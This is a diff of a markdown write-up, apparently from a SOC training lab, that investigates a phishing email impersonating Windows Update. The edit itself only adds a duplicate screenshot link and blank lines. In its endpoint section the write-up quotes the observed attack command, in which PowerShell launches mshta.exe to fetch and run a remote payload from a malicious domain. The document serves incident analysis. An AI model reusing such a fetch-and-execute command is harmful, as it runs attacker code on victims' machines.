@@ -15,6 +15,8 @@ Investigated a phishing campaign impersonating Microsoft Windows Update. The vic
 
 Identified a phishing email from `update@windows-update.site` targeting `dylan@letsdefend.io`. The email directed the victim to `windows-update.site`, which VirusTotal flagged as malicious (10/93 vendors).
 <img width="1574" height="547" alt="338-01-alert" src="https://github.com/user-attachments/assets/61a9f5b3-0b6c-4ebc-aecb-e02591db73f3" />
+<img width="1574" height="547" alt="338-01-alert" src="https://github.com/user-attachments/assets/3ad2426f-81f8-46a7-8a9d-e96f968e0b81" />
+
 
 
 ### 2. Endpoint Analysis
@@ -22,6 +24,8 @@ Identified a phishing email from `update@windows-update.site` targeting `dylan@l
 Investigated workstation `172.16.17.216`. Process and terminal logs revealed PowerShell launching `mshta.exe` to access a suspicious remote payload.
 
     powershell.exe -Command "mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4"
+
+
 
 ### 3. Network Analysis
 
